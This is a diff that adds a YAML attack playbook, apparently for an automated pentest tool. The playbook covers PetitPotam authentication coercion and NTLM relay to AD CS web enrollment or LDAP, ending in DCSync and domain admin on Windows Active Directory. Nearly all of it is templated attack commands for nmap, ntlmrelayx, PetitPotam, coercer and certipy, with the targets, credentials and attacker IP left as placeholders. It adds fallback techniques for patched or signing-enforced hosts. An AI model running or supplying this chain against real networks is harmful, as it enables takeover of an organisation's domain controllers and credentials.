@@ -1,0 +1,44 @@
+id: ad_petitpotam
+title: "AD — PetitPotam coercion → NTLM relay to AD CS / LDAPS"
+phase: lateral
+mitre: ["T1187", "T1557.001"]
+trigger:
+  services: ["smb", "msrpc"]
+  ports:    [445, 135]
+  os_any:   ["windows server"]
+  technologies: ["active directory"]
+  cves:     ["CVE-2021-36942"]
+keywords: ["petitpotam", "ms-efsrpc", "coerce auth", "ntlmrelayx", "adcs relay"]
+preconditions:
+  - "Network position to receive incoming NTLM auth (same VLAN or routable listener)"
+  - "Target with EFSRPC enabled (default on most Windows Servers)"
+steps:
+  - tool: nmap
+    cmd:  "nmap -p445 --script=smb-protocols,smb-security-mode {dc_ip}"
+    why:  "Confirm SMB signing NOT required — NTLM relay only works without signing"
+  - tool: ntlmrelayx
+    cmd:  "ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp --adcs --template DomainController -smb2support"
+    why:  "Listener: relay incoming NTLM auth to AD CS web enrollment to issue a DC cert (ESC8)"
+  - tool: petitpotam
+    cmd:  "PetitPotam.py -u '' -p '' -d {domain} {attacker_ip} {dc_ip}"
+    why:  "UNAUTHENTICATED coercion (CVE-2021-36942) — pre-Aug-2021 patch"
+  - tool: petitpotam
+    cmd:  "PetitPotam.py -u {user} -p {password} -d {domain} {attacker_ip} {dc_ip}"
+    why:  "Authenticated variant (post-patch) — any low-priv user works"
+  - tool: coercer
+    cmd:  "coercer coerce -u {user} -p {password} -d {domain} -t {dc_ip} -l {attacker_ip}"
+    why:  "Tries 12+ coercion methods (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, etc.)"
+  - tool: ntlmrelayx
+    cmd:  "ntlmrelayx.py -t ldap://{dc_ip} --no-smb-server --escalate-user {user} --delegate-access"
+    why:  "Alt relay target — LDAP for RBCD attack: write msDS-AllowedToActOnBehalfOfOtherIdentity on victim"
+  - tool: certipy
+    cmd:  "certipy auth -pfx {dc}.pfx -dc-ip {dc_ip}"
+    why:  "Authenticate with the issued DC cert → TGT → DCSync"
+expected_outcome: "DC certificate / TGT → DCSync → krbtgt → DA"
+fallbacks:
+  - "DFSCoerce (TS-DFSNM) — works when EFSRPC patched"
+  - "ShadowCoerce (FSRVP) / PrinterBug (MS-RPRN) — alt MS-RPC abuses"
+  - "If SMB signing required → relay LDAPS instead with --remove-mic"
+references:
+  - "https://github.com/topotam/PetitPotam"
+  - "https://github.com/p0dalirius/Coercer"
